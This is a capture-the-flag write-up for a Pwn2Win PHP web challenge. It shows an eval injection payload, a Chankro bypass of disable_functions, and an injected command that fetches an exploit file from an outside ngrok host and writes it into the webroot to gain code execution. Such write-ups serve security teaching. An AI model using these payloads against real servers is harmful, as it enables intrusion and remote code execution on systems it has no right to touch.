---
title: Pwn2Win - CmonSeemyVulns - Writeup
tags: pwn2win web php disable_functions chankro
---

# Description

![2021-05-30_21-03](https://user-images.githubusercontent.com/84577967/120118699-267d5280-c194-11eb-8fae-0fec1de1b704.png)

We were given the source code and the Dockerfile, we can build it locally and work on it directly on our own system.

[c_mon_see_my_vulns](https://github.com/ab2pentest/ctfwriteups/files/6566856/c_mon_see_my_vulns_70097e678d572b03e8098868191037f5c3518ca4a8d0512573845db8a293a153.tar.gz)

# Code Review

![2021-05-30_20-54](https://user-images.githubusercontent.com/84577967/120118712-31d07e00-c194-11eb-9ca7-dea97992fbed.png)

Snipped code from: index.php (Only PHP Part !)

![code](https://user-images.githubusercontent.com/84577967/174141852-b43da8d4-6069-43a4-a93f-406eb0b44b37.png)

The 7th line of the code appears to contain an `eval` function that is called within the `do_calcs` function. 
This function is called in line 17 of the code. Before we can examine this further, we need to check the 4th line of the code, which appears to contain a regular expression pattern. 
This suggests that our PHP code must be placed within `{{PHP EVAL CODE}}` in order to be evaluated properly.

![code](https://user-images.githubusercontent.com/84577967/174358220-78ffee4d-d1ee-49f5-a2c8-4b474068e8b5.png)

# Solution

Let's try to send a simple payload `200,{{phpinfo()}}`

![phpinfo](https://user-images.githubusercontent.com/84577967/174358466-4c209820-f9e6-48ca-892a-030d8d922abf.png)

This simple `phpinfo` function is going to be executed

![2021-05-30_21-11](https://user-images.githubusercontent.com/84577967/120118671-fdf55880-c193-11eb-9db9-0f1846e00f00.png)

But if we take a look on the disabled functions list, we see a list of functions that are restricted or not available for use.

```
exec,system,passthru,shell_exec,escapeshellarg,escapeshellcmd,proc_close,proc_open,dl,popen,show_source,posix_kill,posix_mkfifo,posix_getpwuid,posix_setpgid,posix_setsid,posix_setuid,posix_setgid,posix_seteuid,posix_setegid,posix_uname,pcntl_exec,expect_popen
```

In cases where we need to bypass disabled functions, we can use [Chankro](https://github.com/TarlogicSecurity/Chankro)

First let's build our payload:

```bash
python2 chankro.py --arch 64 --input shell.sh --path /var/www/html --output exploit.txt
```

The shell.sh content:

```
#!/bin/sh
/readflag > /var/www/html/flag.txt
```

Now that we have saved the shell, we can host it on a local web server using PHP or Python.

```
200,{{file_put_contents("/var/www/html/exploit.php",file_get_contents("http://XXXXXXXXX.ngrok.io/exploit.txt"),FILE_APPEND)}}
```

![payload](https://user-images.githubusercontent.com/84577967/174358048-7ea473ea-06b6-407b-9f1e-e89ff5b433ad.png)

After that we can browser the file http://127.0.0.1:1337/exploit.php

# Flag

We should be able to retrieve the flag easily http://127.0.0.1:1337/flag.txt
